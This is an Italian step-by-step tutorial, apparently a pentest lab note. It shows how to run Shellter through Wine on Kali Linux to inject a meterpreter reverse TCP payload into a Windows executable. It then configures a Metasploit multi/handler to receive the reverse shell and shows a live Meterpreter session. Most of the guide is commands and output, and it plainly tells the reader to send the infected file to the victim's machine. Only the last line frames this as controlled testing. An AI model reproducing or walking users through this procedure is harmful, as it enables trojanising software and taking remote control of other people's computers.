# Utilizzo di Shellter con Wine su Kali Linux

Questa guida mostra come copiare un binario Windows, avviare Shellter tramite Wine ed eseguire l’iniezione di un payload in un file PE.

---

## 🔹 1. Avviare un terminale root e preparare il binario

```bash
sudo su
cd /usr/share/windows-binaries
ls
cp whoami.exe /opt/shellter/shellter
cd /opt/shellter/shellter
```

---

## 🔹 2. Aprire un nuovo terminale e lanciare Shellter

```bash
sudo wine shellter.exe




        1010101 01   10 0100110 10     01  11001001 0011101 001001
        11      10   01 00      01     01     01    10      11   10
        0010011 1110001 11011   11     10     00    10011   011001
             11 00   10 01      11     01     11    01      01   11
        0010010 11   00 0011010 100111 000111 00    1100011 01   10 v7.2
        www.ShellterProject.com                     Wine Mode




Choose Operation Mode - Auto/Manual (A/M/H): a
PE Target: whoami.exe
```

---

## 🔹 3. Inserimento dei parametri richiesti da Shellter

Durante l’operazione, comparirà una schermata nera, ma il terminale continuerà a chiedere valori da inserire:
```bash
Enable Stealth Mode? (Y/N/H): n
Use a listed payload or custom? (L/C/H): L
Select payload by index: 1
SET LHOST: <IP MACCHINA KALI>
SET LPORT: 5555
```

---

## ✔️ Fine procedura Creazione Payload

A questo punto Shellter genererà il file PE modificato con il payload selezionato.
Ti basterà mandare il file al computer windows dellla vittima

---
# Uso di Metasploit per Gestire il Payload 

Dopo aver generato il payload con Shellter, configuriamo Metasploit per ricevere la reverse shell dalla macchina Windows.

---

## 🔹 1. Inviare il file alla macchina Windows

Una volta generato il file PE infetto, **basta trasferirlo** alla macchina Windows.


---

## 🔹 2. Avviare Metasploit su Kali

Apri una nuova console su Kali:

```bash
sudo msfconsole
```

Output iniziale:

```
Metasploit tip: Enable HTTP request and response logging with set HttpTrace true

      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo
  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx
  lOOOOOOOO.         ;d;         ,OOOOOOOOl
  .OOOOOOOO.   .;           ;    ,OOOOOOOO.
   cOOOOOOO.   .OOc.     'oOO.   ,OOOOOOOc
    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo
     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl
      ;OOOO'   .OOOO.   :OOOO.   ;OOOO;
       .dOOo   .OOOOocccxOOOO.   xOOd.
         ,kOl  .OOOOOOOOOOOOO. .dOk,
           :kk;.OOOOOOOOOOOOO.cOk:
             ;kOOOOOOOOOOOOOOOk:
               ,xOOOOOOOOOOOx,
                 .lOOOOOOOl.
                    ,dOd,
                      .

=[ metasploit v6.4.84-dev                                ]
+ -- --=[ 2,547 exploits - 1,309 auxiliary - 1,683 payloads     ]
+ -- --=[ 432 post - 49 encoders - 13 nops - 9 evasion          ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project
```

---

## 🔹 3. Configurare il multi/handler

```bash
msf > use exploit/multi/handler
```

Mostrare i payload disponibili:

```bash
msf exploit(multi/handler) > show payloads
```

---

## 🔹 4. Identificare il payload generato da Shellter

Torna nel terminale di Wine dove Shellter ha generato il payload e cerca:

```bash
****************
* Payload Info *
****************

Payload: meterpreter_reverse_tcp

Size: 281 bytes

Reflective Loader: NO

Encoded-Payload Handling: Enabled

Handler Type: IAT
```

Il payload utilizzato è **meterpreter_reverse_tcp**.

---

## 🔹 5. Impostare il payload giusto in Metasploit

```bash
msf exploit(multi/handler) > set payload payload/windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
```

Visualizza le opzioni richieste:

```bash
msf exploit(multi/handler) > show options
```

Output tipico:

```
Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique
   LHOST                      yes       The listen address
   LPORT     4444             yes       The listen port
```

---

## 🔹 6. Impostare LPORT e LHOST

```bash
msf exploit(multi/handler) > set LPORT 5555
LPORT => 5555

msf exploit(multi/handler) > set LHOST <IP MACCHINA KALI>
LHOST => <IP MACCHINA KALI>
```

---

## 🔹 7. Avviare il listener

```bash
msf exploit(multi/handler) > run
```

Esempio di output:

```
[*] Started reverse TCP handler on <IP MACCHINA KALI>:5555
[*] Sending stage (177734 bytes) to 192.168.254.148
[*] Meterpreter session 1 opened (<IP MACCHINA KALI>:5555 -> <IP MACCHINA WINDOWS>:49243) at 2025-11-13 12:08:33 +0100
```

---

## 🔹 8. Sessione Meterpreter Attiva

```bash
meterpreter > ls
Listing: C:\Users\nome\Downloads
====================================

Mode              Size      Type  Last modified              Name
----              ----      ----  -------------              ----
100777/rwxrwxrwx  66560     fil   2025-11-13 12:08:20 +0100  whoami.exe


meterpreter >
```

---

## ✔️ Procedura completata

Hai ora una sessione **Meterpreter attiva** proveniente dal payload generato con Shellter, utile per i test controllati nel tuo ambiente vittima.

